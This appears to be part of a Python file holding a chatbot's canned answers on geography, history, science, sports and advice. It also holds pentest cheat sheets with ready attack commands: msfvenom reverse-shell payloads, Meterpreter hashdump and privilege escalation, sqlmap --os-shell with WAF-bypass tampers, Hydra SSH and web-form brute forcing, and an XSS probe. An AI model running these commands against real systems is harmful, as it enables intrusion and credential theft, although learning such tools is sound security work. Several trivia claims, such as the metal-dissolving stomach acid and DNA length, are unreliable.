🌍 HAMARI DUNIYA - COMPLETE OVERVIEW

Facts About Earth:
  • Age: 4.54 Billion years
  • Diameter: 12,742 km
  • Circumference: 40,075 km
  • 71% Water, 29% Land
  • Population: ~8.1 Billion (2024)

7 Continents:
  1. Asia          → Largest (44.6M km²) - 4.7B people
  2. Africa        → 2nd Largest - 54 countries
  3. North America → USA, Canada, Mexico etc.
  4. South America → Brazil, Argentina etc.
  5. Europe        → 44 countries, EU
  6. Australia     → Smallest continent
  7. Antarctica    → Coldest, no permanent residents

5 Oceans:
  1. Pacific  → Largest ocean
  2. Atlantic → 2nd largest
  3. Indian   → 3rd largest
  4. Southern → Around Antarctica
  5. Arctic   → Smallest, coldest

Highest Points:
  • Highest Mountain: Mount Everest (8,848.86m) - Nepal/China
  • Deepest Ocean: Mariana Trench (11,034m) - Pacific
  • Largest Desert: Sahara - Africa
  • Longest River: Nile - Africa (6,650 km)
  • Largest Country: Russia (17.1M km²)
  • Smallest Country: Vatican City (0.44 km²)
""",

    "pakistan": """
🇵🇰 PAKISTAN - COMPLETE INFORMATION

Basic Info:
  • Full Name: Islamic Republic of Pakistan
  • Capital: Islamabad
  • Largest City: Karachi
  • Population: ~230 Million
  • Area: 881,913 km²
  • Language: Urdu (national), English (official)
  • Religion: Islam (96%)
  • Currency: Pakistani Rupee (PKR)
  • Independence: 14 August 1947

Geography:
  • Located in South Asia
  • Borders: India (East), Afghanistan & Iran (West)
           China (North), Arabian Sea (South)
  • Highest Peak: K2 (8,611m) - 2nd highest in world
  • Major Rivers: Indus, Jhelum, Chenab, Ravi, Sutlej

Provinces:
  1. Punjab        → Largest by population
  2. Sindh         → Karachi (economic hub)
  3. KPK           → Peshawar
  4. Balochistan   → Largest by area
  5. Gilgit-Baltistan (Territory)
  6. AJK (Territory)

History Key Points:
  • Ancient: Indus Valley Civilization (3300 BC)
  • Mughal Era: 1526-1857
  • British Rule: 1857-1947
  • Pakistan Created: 1947 by Quaid-e-Azam M.A. Jinnah
  • 1971: East Pakistan became Bangladesh
  • Nuclear Power since: 1998

Famous People:
  • Quaid-e-Azam M.A. Jinnah (Founder)
  • Allama Iqbal (National Poet)
  • Imran Khan (Cricketer & PM)
  • Malala Yousafzai (Nobel Prize)
  • Dr. Abdul Qadeer Khan (Nuclear Scientist)
""",

    "india": """
🇮🇳 INDIA - COMPLETE INFORMATION

Basic Info:
  • Full Name: Republic of India
  • Capital: New Delhi
  • Largest City: Mumbai
  • Population: ~1.44 Billion (World's most populous)
  • Area: 3.29 Million km²
  • Languages: Hindi, English + 22 official languages
  • Currency: Indian Rupee (INR)
  • Independence: 15 August 1947

Key Facts:
  • World's largest democracy
  • 28 States, 8 Union Territories
  • Borders Pakistan, China, Nepal, Bangladesh, Bhutan, Myanmar
  • Major rivers: Ganges, Yamuna, Brahmaputra

History:
  • Ancient: Indus Valley, Vedic civilization
  • Maurya Empire: Ashoka (3rd century BC)
  • Mughal Empire: 1526-1857
  • British Raj: 1858-1947
  • Independence: 1947 (Partition with Pakistan)

Economy:
  • 5th largest economy (GDP ~$3.5 Trillion)
  • IT capital: Bangalore
  • Major industries: IT, textiles, agriculture
""",

    "china": """
🇨🇳 CHINA - COMPLETE INFORMATION

Basic Info:
  • Full Name: People's Republic of China
  • Capital: Beijing
  • Largest City: Shanghai
  • Population: ~1.41 Billion
  • Area: 9.6 Million km² (4th largest)
  • Language: Mandarin (Putonghua)
  • Currency: Yuan (CNY)
  • Government: Communist Party

Economy:
  • 2nd largest economy (GDP ~$18 Trillion)
  • World's largest exporter
  • Manufacturing superpower

Famous Things:
  • Great Wall of China
  • Forbidden City
  • Terracotta Army
  • Giant Panda
  • Invented: Paper, Printing, Gunpowder, Compass
""",

    "usa": """
🇺🇸 UNITED STATES OF AMERICA

Basic Info:
  • Capital: Washington D.C.
  • Largest City: New York City
  • Population: ~335 Million
  • Area: 9.83 Million km² (3rd or 4th largest)
  • Language: English (de facto)
  • Currency: US Dollar (USD)
  • Government: Federal Republic

Key Facts:
  • 50 States + Washington D.C.
  • World's largest economy (GDP ~$27 Trillion)
  • Military superpower
  • Founded: 4 July 1776 (Declaration of Independence)
  • President as of 2024: Joe Biden (46th), Donald Trump (47th from Jan 2025)

Famous Things:
  • Statue of Liberty
  • NASA & Space exploration
  • Hollywood
  • Silicon Valley (Tech hub)
  • Wall Street (Finance)
""",

    "saudi arabia": """
🇸🇦 SAUDI ARABIA - COMPLETE INFO

Basic Info:
  • Capital: Riyadh
  • Population: ~36 Million
  • Area: 2.15 Million km²
  • Language: Arabic
  • Currency: Saudi Riyal (SAR)
  • Religion: Islam

Key Facts:
  • Birthplace of Islam
  • Holy cities: Mecca & Medina
  • Largest oil producer (ARAMCO)
  • Member of G20
  • King: Salman bin Abdulaziz
  • Crown Prince: Mohammed bin Salman (MBS)

Economy:
  • Heavily oil-dependent
  • Vision 2030: Diversification plan
  • One of richest countries per capita
""",

    # ==================== HISTORY ====================
    "world history": """
📜 WORLD HISTORY - MAJOR ERAS

🏛️ Ancient History (3000 BC - 500 AD):
  • Mesopotamia (Iraq) - World's first civilization
  • Ancient Egypt - Pharaohs, Pyramids
  • Indus Valley - Harappa, Mohenjo-daro (Pakistan/India)
  • Ancient Greece - Democracy, Philosophy
  • Roman Empire - Largest empire of its time

⚔️ Medieval Period (500-1500 AD):
  • Byzantine Empire
  • Islamic Golden Age (700-1200 AD) - Science, Math, Medicine
  • Crusades (1095-1291)
  • Mongol Empire - Largest land empire (Genghis Khan)
  • Ottoman Empire (1299-1922)

🚀 Modern History (1500-1900):
  • Renaissance in Europe
  • Age of Exploration (Columbus, Vasco da Gama)
  • Industrial Revolution (1760-1840)
  • American Revolution (1776)
  • French Revolution (1789)
  • Napoleon Bonaparte's conquests

💣 Contemporary (1900-Present):
  • World War I (1914-1918)
  • World War II (1939-1945)
  • Cold War (1947-1991)
  • Independence movements across Asia & Africa
  • Digital Revolution (1990s-now)
  • 9/11 (2001)
  • COVID-19 Pandemic (2020)
""",

    "world war 2": """
💣 WORLD WAR II (1939-1945)

Overview:
  Most devastating war in human history
  Deaths: ~70-85 Million people

Causes:
  • Rise of Nazi Germany (Hitler)
  • Great Depression's aftermath
  • Treaty of Versailles humiliation
  • Japanese expansion in Asia
  • Failure of appeasement policy

Main Powers:
  ALLIES: USA, UK, USSR, France, China
  AXIS:   Germany, Italy, Japan

Key Events:
  1939: Germany invades Poland → War begins
  1940: Germany conquers France
  1940: Battle of Britain (RAF vs Luftwaffe)
  1941: Germany invades USSR (Operation Barbarossa)
  1941: Japan attacks Pearl Harbor → USA joins
  1942: Battle of Stalingrad (turning point)
  1944: D-Day - Allied invasion of Normandy (6 June)
  1945: Germany surrenders (8 May - VE Day)
  1945: Atomic bombs on Hiroshima & Nagasaki
  1945: Japan surrenders (2 Sept - VJ Day)

Holocaust:
  • 6 Million Jews killed by Nazi Germany
  • Total civilians killed: ~40 Million

Aftermath:
  • United Nations formed (1945)
  • Cold War between USA & USSR
  • Israel created (1948)
  • Decolonization of Asia & Africa
""",

    "world war 1": """
🌍 WORLD WAR I (1914-1918)

Also called: The Great War
Deaths: ~20 Million (military + civilian)

Cause (Immediate):
  Assassination of Archduke Franz Ferdinand
  of Austria-Hungary on 28 June 1914 in Sarajevo

Main Powers:
  ALLIES: France, Britain, Russia, Italy, USA (1917)
  CENTRAL POWERS: Germany, Austria-Hungary, Ottoman Empire

Key Events:
  1914: War begins, trench warfare starts
  1915: Gallipoli Campaign (Ottoman Empire)
  1916: Battle of the Somme (1M casualties)
  1917: USA joins; Russian Revolution
  1918: Germany surrenders - 11 November 1918 (11:11 AM)

Aftermath:
  • Treaty of Versailles (1919) - Germany blamed
  • Ottoman Empire dissolved → Turkey formed
  • Austro-Hungarian Empire collapsed
  • Led directly to WW2
""",

    "islam history": """
☪️ HISTORY OF ISLAM

Founded: 610 AD in Mecca (Arabia)
Founder: Prophet Muhammad ﷺ (PBUH)

Key Events:
  570 AD:  Birth of Prophet Muhammad ﷺ in Mecca
  610 AD:  First revelation in Cave Hira
  622 AD:  Hijra (Migration to Medina) - Islamic calendar starts
  630 AD:  Conquest of Mecca
  632 AD:  Death of Prophet Muhammad ﷺ

Caliphs (Khulafa-e-Rashideen):
  1. Hazrat Abu Bakr Siddiq (632-634)
  2. Hazrat Umar ibn Khattab (634-644)
  3. Hazrat Uthman ibn Affan (644-656)
  4. Hazrat Ali ibn Abi Talib (656-661)

Major Empires:
  • Umayyad Caliphate (661-750) - Damascus
  • Abbasid Caliphate (750-1258) - Baghdad (Golden Age)
  • Ottoman Empire (1299-1922) - Istanbul

Islamic Golden Age (800-1200 AD):
  • Al-Khawarizmi → Algebra (Algorithm)
  • Ibn Sina (Avicenna) → Medicine
  • Al-Biruni → Astronomy & Geography
  • Ibn Rushd → Philosophy

Spread:
  Islam spread from Arabia to:
  Middle East, North Africa, Spain, Central Asia,
  South Asia (Pakistan, India, Bangladesh),
  Southeast Asia (Indonesia, Malaysia)

Today:
  • 1.9 Billion Muslims worldwide
  • 2nd largest religion
  • 57 Muslim-majority countries
""",

    "mughal empire": """
🏯 MUGHAL EMPIRE (1526-1857)

Founded by: Babur (1526) after Battle of Panipat
Capital: Agra → Delhi (Shahjahanabad)
Peak Territory: Most of South Asia

Famous Mughal Emperors:
  1. Babur (1526-1530)     → Founder, from Fergana (Uzbekistan)
  2. Humayun (1530-1556)   → Lost & regained throne
  3. Akbar (1556-1605)     → Greatest ruler, religious tolerance
  4. Jahangir (1605-1627)  → Art lover
  5. Shah Jahan (1628-1658)→ Built Taj Mahal
  6. Aurangzeb (1658-1707) → Largest territory, strict Islamic law
  7. Bahadur Shah Zafar    → Last Emperor (exiled by British 1857)

Famous Monuments:
  • Taj Mahal (Shah Jahan for Mumtaz)
  • Red Fort, Delhi
  • Badshahi Mosque, Lahore (Aurangzeb)
  • Shalimar Gardens
  • Lahore Fort

Legacy:
  • Urdu language developed
  • Mughal architecture style
  • Mixed Persian-Indian culture
""",

    # ==================== SCIENCE ====================
    "science": """
🔬 SCIENCE - OVERVIEW

Major Branches:
  Physics    → Matter, energy, forces, universe
  Chemistry  → Elements, compounds, reactions
  Biology    → Living organisms
  Astronomy  → Stars, planets, universe
  Geology    → Earth's structure

Greatest Scientists:
  • Isaac Newton      → Gravity, Laws of Motion
  • Albert Einstein   → Theory of Relativity (E=mc²)
  • Charles Darwin    → Evolution (Natural Selection)
  • Marie Curie       → Radioactivity (2x Nobel Prize)
  • Galileo Galilei   → Telescope, heliocentrism
  • Stephen Hawking   → Black holes, cosmology
  • Nikola Tesla      → Electricity, AC power

Key Scientific Theories:
  • Big Bang Theory   → Universe origin (13.8 Billion years ago)
  • Evolution         → Species change over time
  • Relativity        → Space-time, E=mc²
  • Quantum Mechanics → Subatomic particles
  • Plate Tectonics   → Continental drift
""",

    "solar system": """
☀️ SOLAR SYSTEM - COMPLETE GUIDE

Our Sun:
  • Type: G-type main sequence star
  • Age: 4.6 Billion years
  • Temperature: 5,500°C (surface), 15M°C (core)
  • Comprises 99.86% of solar system's mass

8 Planets (In order):
  1. Mercury  → Smallest, closest to Sun, no atmosphere
  2. Venus    → Hottest (462°C), Earth's twin in size
  3. Earth    → Our home, only known life
  4. Mars     → Red planet, 2 moons, Olympus Mons
  5. Jupiter  → Largest planet, 95 moons, Great Red Spot
  6. Saturn   → Ring system, 146 moons, least dense
  7. Uranus   → Ice giant, rotates on side
  8. Neptune  → Farthest, strongest winds

Special Objects:
  • Moon       → Earth's natural satellite
  • Asteroid Belt → Between Mars & Jupiter
  • Pluto      → Dwarf planet (reclassified 2006)
  • Comets     → Ice & dust from outer solar system

Space Milestones:
  1957 → Sputnik 1 (First satellite - USSR)
  1961 → Yuri Gagarin (First human in space)
  1969 → Neil Armstrong (First on Moon)
  2004 → Mars rovers (Spirit & Opportunity)
  2023 → India's Chandrayaan-3 (Moon south pole)
""",

    "human body": """
🫀 HUMAN BODY - AMAZING FACTS

Basic Stats:
  • Cells: ~37 Trillion
  • Bones: 206 (babies have 270)
  • Muscles: ~640
  • Brain neurons: ~86 Billion
  • Heart beats: ~100,000 per day
  • Blood vessels: 96,000 km long
  • DNA: If stretched = 2x Earth-Sun distance

Major Systems:
  1. Circulatory  → Heart, blood, vessels
  2. Respiratory  → Lungs, breathing
  3. Digestive    → Stomach, intestines
  4. Nervous      → Brain, spinal cord, nerves
  5. Skeletal     → Bones, joints
  6. Muscular     → Movement
  7. Immune       → Defense against disease
  8. Endocrine    → Hormones, glands

Brain Facts:
  • Uses 20% of body's energy
  • 75% water
  • Can hold ~2.5 Petabytes of data
  • Generates 25 watts of power
  • Never stops working (even in sleep)

Amazing Facts:
  • Liver can regenerate itself
  • Stomach acid can dissolve metal
  • You have a new skeleton every 10 years
  • Humans share 60% DNA with bananas!
  • Eyes can see 10 million colors
""",

    # ==================== TECHNOLOGY ====================
    "artificial intelligence": """
🤖 ARTIFICIAL INTELLIGENCE - COMPLETE GUIDE

What is AI:
  Machines that can perform tasks that normally require
  human intelligence — thinking, learning, problem solving.

Types of AI:
  1. Narrow AI (ANI)  → Good at one specific task
                        Examples: Siri, Google Maps, Netflix
  2. General AI (AGI) → Human-level intelligence (developing)
  3. Super AI (ASI)   → Surpasses humans (theoretical)

Major AI Technologies:
  • Machine Learning (ML) → Learns from data
  • Deep Learning (DL)    → Neural networks
  • NLP                   → Understanding language
  • Computer Vision       → Understanding images
  • Robotics              → Physical AI

Famous AI Systems:
  • ChatGPT (OpenAI)    → Most popular AI chatbot
  • Claude (Anthropic)  → Advanced AI assistant
  • Gemini (Google)     → Google's AI
  • Grok (xAI)          → Elon Musk's AI
  • Copilot (Microsoft) → Coding AI
  • DALL-E              → Image generation
  • Midjourney          → Art generation

AI in Real Life:
  → Medical diagnosis
  → Self-driving cars
  → Fraud detection
  → Voice assistants
  → Recommendation systems
  → Language translation

Future:
  AGI expected: 2027-2030 (predictions vary)
  AI will transform every industry
""",

    "blockchain": """
⛓️ BLOCKCHAIN - COMPLETE EXPLANATION

What is Blockchain:
  A decentralized, distributed digital ledger that records
  transactions across many computers securely.

Key Features:
  • Decentralized (No single authority)
  • Immutable (Cannot be changed)
  • Transparent (Anyone can verify)
  • Secure (Cryptographically protected)

How it Works:
  1. Transaction happens
  2. Transaction broadcast to P2P network
  3. Network validates transaction
  4. Transaction combined with others (block)
  5. Block added to chain permanently
  6. Transaction complete!

Famous Blockchains:
  • Bitcoin    → First blockchain (2009, Satoshi Nakamoto)
  • Ethereum   → Smart contracts, DApps
  • Solana     → Fast & cheap transactions
  • Cardano    → Academic approach

Uses:
  → Cryptocurrency
  → NFTs
  → Supply chain management
  → Smart contracts
  → Healthcare records
  → Voting systems
""",

    "cryptocurrency": """
💰 CRYPTOCURRENCY - COMPLETE GUIDE

What is it:
  Digital/virtual currency secured by cryptography,
  operating on blockchain technology.

Top Cryptocurrencies:
  1. Bitcoin (BTC)      → First crypto (2009), "Digital Gold"
  2. Ethereum (ETH)     → Smart contracts platform
  3. USDT (Tether)      → Stablecoin ($1 always)
  4. BNB                → Binance's token
  5. Solana (SOL)       → Fast blockchain
  6. XRP (Ripple)       → Banking focused
  7. Cardano (ADA)      → Research-based

Key Terms:
  • Wallet    → Store your crypto
  • Exchange  → Buy/sell crypto (Binance, Coinbase)
  • Mining    → Create new coins by solving math
  • HODL      → Hold long term
  • DeFi      → Decentralized Finance
  • NFT       → Non-Fungible Token

Bitcoin History:
  2009: $0 (created by Satoshi Nakamoto)
  2010: First purchase - 2 pizzas for 10,000 BTC
  2017: $20,000 (all-time high then)
  2021: $69,000 (all-time high)
  2024: ~$60,000-70,000

Risks:
  → Very volatile (can lose 80% value)
  → Not regulated in many countries
  → Scams are common
  → Technical complexity
""",

    # ==================== HEALTH ====================
    "health": """
💊 HEALTH - COMPLETE GUIDE

Fundamentals of Good Health:
  1. Nutrition    → Eat balanced diet
  2. Exercise     → At least 150 min/week
  3. Sleep        → 7-9 hours per night
  4. Hydration    → 8-10 glasses water/day
  5. Mental Health→ Manage stress
  6. No smoking   → Avoid tobacco/alcohol

Nutrition Basics:
  Macronutrients:
  • Carbohydrates → Energy (rice, bread, fruits)
  • Proteins      → Muscle repair (meat, eggs, lentils)
  • Fats          → Brain function (nuts, oil, fish)

  Micronutrients:
  • Vitamins (A, B, C, D, E, K)
  • Minerals (Iron, Calcium, Zinc, Magnesium)

Common Diseases & Prevention:
  • Heart Disease  → Less fat, exercise, no smoking
  • Diabetes       → Less sugar, exercise, healthy weight
  • Cancer         → Early detection, healthy lifestyle
  • Hypertension   → Low salt, manage stress

Mental Health:
  → Very important, often ignored
  → Common issues: Depression, Anxiety, OCD, PTSD
  → Treatment: Therapy, medication, lifestyle

Tip:
  Prevention is better than cure!
  Regular checkups save lives.
""",

    # ==================== MATHEMATICS ====================
    "mathematics": """
🔢 MATHEMATICS - OVERVIEW

Major Branches:
  • Arithmetic    → Basic operations
  • Algebra       → Variables & equations
  • Geometry      → Shapes & spaces
  • Calculus      → Change & motion
  • Statistics    → Data analysis
  • Number Theory → Properties of numbers
  • Trigonometry  → Triangles & angles

Famous Mathematicians:
  • Euclid       → Father of Geometry
  • Pythagoras   → Pythagorean theorem (a²+b²=c²)
  • Newton       → Calculus
  • Leibniz      → Also invented Calculus
  • Gauss        → "Prince of Mathematics"
  • Al-Khwarizmi → Father of Algebra (Muslim scholar)
  • Ramanujan    → Number theory genius (India)
  • Euler        → Graph theory, e, π, i

Important Formulas:
  • Area of Circle: πr²
  • Quadratic: x = (-b ± √(b²-4ac)) / 2a
  • Pythagorean: a² + b² = c²
  • E=mc² (Einstein)

Famous Numbers:
  • π (Pi)     = 3.14159265...
  • e (Euler)  = 2.71828...
  • φ (Golden) = 1.61803...
  • √2         = 1.41421...
""",

    # ==================== PYTHON ====================
    "python": """
🐍 PYTHON PROGRAMMING - COMPLETE GUIDE

What is Python:
  High-level, interpreted, general-purpose programming language.
  Created by: Guido van Rossum (1991)

Why Python:
  ✓ Easy to read & write
  ✓ Huge community & libraries
  ✓ Used everywhere
  ✓ Great for beginners & experts

Python Uses:
  • Web Development    (Django, Flask, FastAPI)
  • Data Science       (Pandas, NumPy, Matplotlib)
  • Machine Learning   (TensorFlow, PyTorch, Sklearn)
  • Automation         (Selenium, Requests, PyAutoGUI)
  • Cybersecurity      (Scapy, Pwntools, Impacket)
  • Game Development   (Pygame)
  • Desktop Apps       (Tkinter, PyQt)

Basic Syntax:
  # Variables
  name = "MUSA AI"
  age = 25
  pi = 3.14

  # Functions
  def greet(name):
      return f"Hello {name}!"

  # Loops
  for i in range(10):
      print(i)

  # Classes
  class AI:
      def __init__(self, name):
          self.name = name

Important Libraries:
  requests → HTTP requests
  os       → Operating system
  sys      → System functions
  json     → JSON handling
  re       → Regular expressions
  socket   → Networking
  subprocess→ Run commands
""",

    # ==================== KALI LINUX ====================
    "kali linux": """
🐉 KALI LINUX - COMPLETE GUIDE

What is Kali:
  Debian-based Linux distro for penetration testing.
  Developed by: Offensive Security
  Over 600+ pre-installed security tools.

Installation:
  • Download from: kali.org
  • Can install as: Main OS, VM, WSL, Live USB

Most Important Tools:

  RECONNAISSANCE:
  • Nmap         → Port scanning
  • Amass        → Subdomain enumeration
  • theHarvester → Email, domain info
  • Shodan       → Internet-connected devices
  • Maltego      → Visual link analysis

  WEB HACKING:
  • Burp Suite   → Web app testing (intercept)
  • SQLmap       → SQL injection automation
  • Nikto        → Web server scanner
  • Gobuster     → Directory brute force
  • OWASP ZAP    → Web vulnerability scanner

  EXPLOITATION:
  • Metasploit   → Exploit framework
  • ExploitDB    → Exploit database
  • SearchSploit → Offline exploit search

  PASSWORD ATTACKS:
  • Hydra        → Network login brute force
  • John the Ripper → Password cracker
  • Hashcat      → GPU-accelerated cracking
  • CrunchGen    → Wordlist generator

  WIRELESS:
  • Aircrack-ng  → WiFi cracking suite
  • Wifite       → Automated WiFi attacks
  • Kismet       → Wireless network detector

  POST EXPLOITATION:
  • LinPEAS      → Linux privilege escalation
  • WinPEAS      → Windows privilege escalation
  • BloodHound   → AD attack paths
  • Mimikatz     → Windows credential dump

Essential Commands:
  ifconfig / ip a          → Network info
  nmap -sV -sC target      → Basic scan
  msfconsole               → Start Metasploit
  sqlmap -u "URL" --dbs    → SQL injection
  hydra -l admin -P wordlist ssh://target
""",

    "nmap": """
🔍 NMAP - COMPLETE GUIDE

Nmap = Network Mapper
Used for: Network discovery, port scanning, OS detection

BASIC SCANS:
  nmap 192.168.1.1              → Basic scan
  nmap 192.168.1.0/24           → Scan whole network
  nmap -p 80,443,22 target      → Specific ports
  nmap -p- target               → All 65535 ports
  nmap -p 1-1000 target         → Port range

SERVICE DETECTION:
  nmap -sV target               → Service versions
  nmap -sC target               → Default scripts
  nmap -sV -sC target           → Both (MOST USED)
  nmap -A target                → Aggressive (OS+scripts)

SCAN TYPES:
  nmap -sS target               → SYN scan (stealth)
  nmap -sU target               → UDP scan
  nmap -sT target               → TCP connect scan
  nmap -sP 192.168.1.0/24       → Ping scan (host discovery)

SPEED:
  nmap -T0 target               → Paranoid (slowest)
  nmap -T3 target               → Normal (default)
  nmap -T4 target               → Aggressive (faster)
  nmap -T5 target               → Insane (fastest)

NSE SCRIPTS:
  nmap --script vuln target     → Vulnerability scan
  nmap --script http-enum target→ HTTP enumeration
  nmap --script smb-vuln* target→ SMB vulnerabilities
  nmap --script all target      → ALL scripts (slow)

OUTPUT:
  nmap -oN output.txt target    → Normal output
  nmap -oX output.xml target    → XML output
  nmap -oG output.gnmap target  → Grepable
  nmap -oA output target        → All formats

ADVANCED:
  nmap -D RND:10 target         → Decoy scan
  nmap -f target                → Fragmented packets
  nmap --source-port 53 target  → Source port spoof
""",

    "metasploit": """
⚔️ METASPLOIT - COMPLETE GUIDE

Start: msfconsole

BASIC WORKFLOW:
  search [keyword]         → Find modules
  use [module path]        → Select module
  info                     → Module information
  show options             → See required options
  set RHOSTS [target]      → Set target
  set LHOST [your_ip]      → Set your IP
  set LPORT [port]         → Set port
  run / exploit            → Execute

SEARCH EXAMPLES:
  search ms17-010          → EternalBlue (WannaCry)
  search vsftpd            → FTP exploit
  search type:exploit platform:windows

COMMON EXPLOITS:
  exploit/windows/smb/ms17_010_eternalblue
  exploit/unix/ftp/vsftpd_234_backdoor
  exploit/multi/handler    → Catch reverse shells

PAYLOADS:
  show payloads
  set payload windows/meterpreter/reverse_tcp
  set payload linux/x64/meterpreter/reverse_tcp

METERPRETER COMMANDS:
  sysinfo          → System information
  getuid           → Current user
  getsystem        → Privilege escalation
  hashdump         → Dump password hashes
  upload file      → Upload file
  download file    → Download file
  screenshot       → Take screenshot
  shell            → Get system shell
  background       → Background session
  sessions -l      → List sessions
  sessions -i 1    → Interact with session

GENERATE PAYLOADS (msfvenom):
  msfvenom -p windows/meterpreter/reverse_tcp \\
    LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe

  msfvenom -p linux/x64/meterpreter/reverse_tcp \\
    LHOST=YOUR_IP LPORT=4444 -f elf > shell.elf
""",

    "sqlmap": """
💉 SQLMAP - SQL INJECTION TOOL

Basic Usage:
  sqlmap -u "http://site.com/page.php?id=1"

DETECTION:
  sqlmap -u "URL" --dbs           → List databases
  sqlmap -u "URL" -D dbname --tables     → List tables
  sqlmap -u "URL" -D db -T table --dump  → Dump data

POST REQUESTS:
  sqlmap -u "URL" --data="user=a&pass=b"
  sqlmap -u "URL" --data="user=a&pass=b" -p user

WITH COOKIES:
  sqlmap -u "URL" --cookie="PHPSESSID=abc123"

ADVANCED:
  sqlmap -u "URL" --level=5 --risk=3  → More tests
  sqlmap -u "URL" --random-agent       → Random user agent
  sqlmap -u "URL" --tor               → Use Tor
  sqlmap -u "URL" --batch             → No user input
  sqlmap -u "URL" --os-shell          → Get OS shell
  sqlmap -u "URL" --sql-shell         → SQL shell

BURP REQUEST FILE:
  sqlmap -r request.txt               → Use saved request

BYPASS WAF:
  sqlmap -u "URL" --tamper=space2comment
  sqlmap -u "URL" --tamper=between,randomcase
""",

    "hydra": """
🔑 HYDRA - PASSWORD BRUTE FORCING

Basic Syntax:
  hydra -l user -p pass target service

Common Services:
  hydra -l admin -P passwords.txt target ssh
  hydra -l admin -P passwords.txt target ftp
  hydra -l admin -P passwords.txt target rdp
  hydra -l admin -P passwords.txt target smtp
  hydra -l admin -P passwords.txt target mysql

WEB FORMS:
  hydra -l admin -P pass.txt target \\
    http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

OPTIONS:
  -l user       → Single username
  -L users.txt  → Username list
  -p pass       → Single password
  -P pass.txt   → Password list
  -t 16         → Threads (default 16)
  -s port       → Custom port
  -V            → Verbose (show each attempt)
  -f            → Stop after first find

EXAMPLE FULL:
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\
    192.168.1.100 ssh -t 4 -V
""",

    "burp suite": """
🕷️ BURP SUITE - WEB HACKING

What is it:
  Most powerful web application security testing platform.
  Used by: Bug bounty hunters, pen testers, security researchers

Main Features:
  • Intercept Proxy   → Intercept/modify HTTP traffic
  • Repeater         → Manually resend requests
  • Intruder         → Automated attacks (brute force, fuzzing)
  • Scanner          → Auto vulnerability discovery (Pro)
  • Decoder          → Encode/decode data
  • Sequencer        → Session token analysis

Setup:
  1. Start Burp Suite
  2. Configure browser proxy: 127.0.0.1:8080
  3. Install Burp CA certificate in browser
  4. Browse target → Burp captures traffic

Intercept & Modify:
  → Turn Intercept ON
  → Browse to target page
  → Modify request parameters
  → Forward modified request

SQL Injection Testing:
  → Capture login request
  → Send to Repeater
  → Add ' to parameters
  → Check response

XSS Testing:
  → Inject: <script>alert(1)</script>
  → Check if reflected in response
""",

    # ==================== LIFE ADVICE ====================
    "success": """
🏆 HOW TO BE SUCCESSFUL

Success means different things to different people.
But here are UNIVERSAL principles:

Core Principles:
  1. CLEAR GOALS      → Know exactly what you want
  2. CONSISTENCY      → Small daily actions add up
  3. LEARN ALWAYS     → Never stop growing
  4. RESILIENCE       → Failures are lessons
  5. RELATIONSHIPS    → Network matters
  6. DISCIPLINE       → Do it even when you don't want to
  7. PATIENCE         → Success takes time

Daily Habits of Successful People:
  ✦ Wake up early
  ✦ Exercise regularly
  ✦ Read books (Leaders are readers)
  ✦ Plan your day
  ✦ Review goals weekly
  ✦ Sleep 7-8 hours
  ✦ Meditate / reflect

Warren Buffett says:
  "The best investment you can make is in yourself."

Key Wisdom:
  → Focus on process, not just outcome
  → Comparison is the thief of joy
  → Your environment shapes you
  → Delayed gratification = success
  → Find your WHY
""",

    "how to make money": """
💵 HOW TO MAKE MONEY - REAL GUIDE

Traditional Ways:
  • Get educated → Get good job → Earn salary
  • Freelancing (Fiverr, Upwork, Toptal)
  • Start a business
  • Invest in stocks/real estate

Online Income Sources:
  1. Freelancing
     → Programming, design, writing
     → Platforms: Fiverr, Upwork
     → Potential: $500-$5000/month

  2. YouTube
     → Content creation
     → Monetize with ads
     → Time to earn: 6-12 months

  3. Programming
     → Web development: $50-150/hour
     → App development: $50-200/hour

  4. Cybersecurity
     → Bug Bounty: Hackerone, Bugcrowd
     → Pen Testing: $100-300/hour
     → Certifications: OSCP, CEH, CISSP

  5. Trading (High Risk!)
     → Stock market
     → Crypto (very volatile)
     → Forex

  6. Digital Products
     → Sell courses online
     → Ebooks
     → Software tools

Best Advice:
  → Learn a high-income skill first
  → Skills → Service → Scale
  → Don't quit your job too early
  → Emergency fund = 6 months expenses
  → Invest 20% of earnings
""",

    # ==================== SPORTS ====================
    "cricket": """
🏏 CRICKET - COMPLETE GUIDE

Overview:
  Most popular sport in South Asia & parts of world.
  Played between 2 teams of 11 players.

Formats:
  • Test Cricket    → 5 days, traditional form
  • ODI (One Day)   → 50 overs per side
  • T20             → 20 overs per side (most popular now)

Pakistan Cricket:
  ICC Rankings (fluctuates):
  Famous Players:
  → Imran Khan      → Greatest all-rounder
  → Wasim Akram     → Greatest left-arm fast bowler
  → Javed Miandad   → Greatest batsman
  → Shahid Afridi   → T20 legend
  → Babar Azam      → Current #1 batsman
  → Shaheen Afridi  → Best fast bowler

World Cup Winners (ODI):
  1975 - West Indies
  1983 - India
  1987 - Australia
  1992 - Pakistan ★
  1996 - Sri Lanka
  1999 - Australia
  2003 - Australia
  2007 - Australia
  2011 - India
  2015 - Australia
  2019 - England
  2023 - Australia

Records:
  Most Test runs: Sachin Tendulkar (India) - 15,921
  Most Test wickets: Muttiah Muralitharan (Sri Lanka) - 800
  Fastest T20 century: Many players (30 balls)
""",

    "football": """
⚽ FOOTBALL (SOCCER) - WORLD GAME

Most Popular sport on Earth!
  ~4 Billion fans worldwide

Major Leagues:
  • Premier League      → England (Most popular)
  • La Liga             → Spain (Real Madrid, Barca)
  • Serie A             → Italy
  • Bundesliga          → Germany
  • Ligue 1             → France
  • MLS                 → USA

FIFA World Cup Winners:
  Brazil      → 5 times (1958,62,70,94,2002)
  Germany     → 4 times
  Italy       → 4 times
  Argentina   → 3 times (2022 - Messi!)
  France      → 2 times
  England     → 1 time (1966)

GOAT Debate:
  Lionel Messi (Argentina):
  → 8 Ballon d'Or awards
  → World Cup 2022 winner
  → Most career goals in football

  Cristiano Ronaldo (Portugal):
  → 5 Ballon d'Or awards
  → Most international goals (130+)

Positions:
  Goalkeeper, Defenders (CB/RB/LB)
  Midfielders (CM/CAM/CDM)
  Forwards (ST/RW/LW)
""",

    # ==================== PHILOSOPHY ====================
    "life meaning": """
🌟 WHAT IS THE MEANING OF LIFE?

This is humanity's oldest question. Different answers:

Religious Views:
  Islam:    → To worship Allah and follow His guidance
  Christianity → To love God and serve others
  Hinduism  → Dharma, karma, moksha (liberation)
  Buddhism  → End suffering, achieve Nirvana

Philosophical Views:
  Aristotle → Eudaimonia (flourishing/happiness)
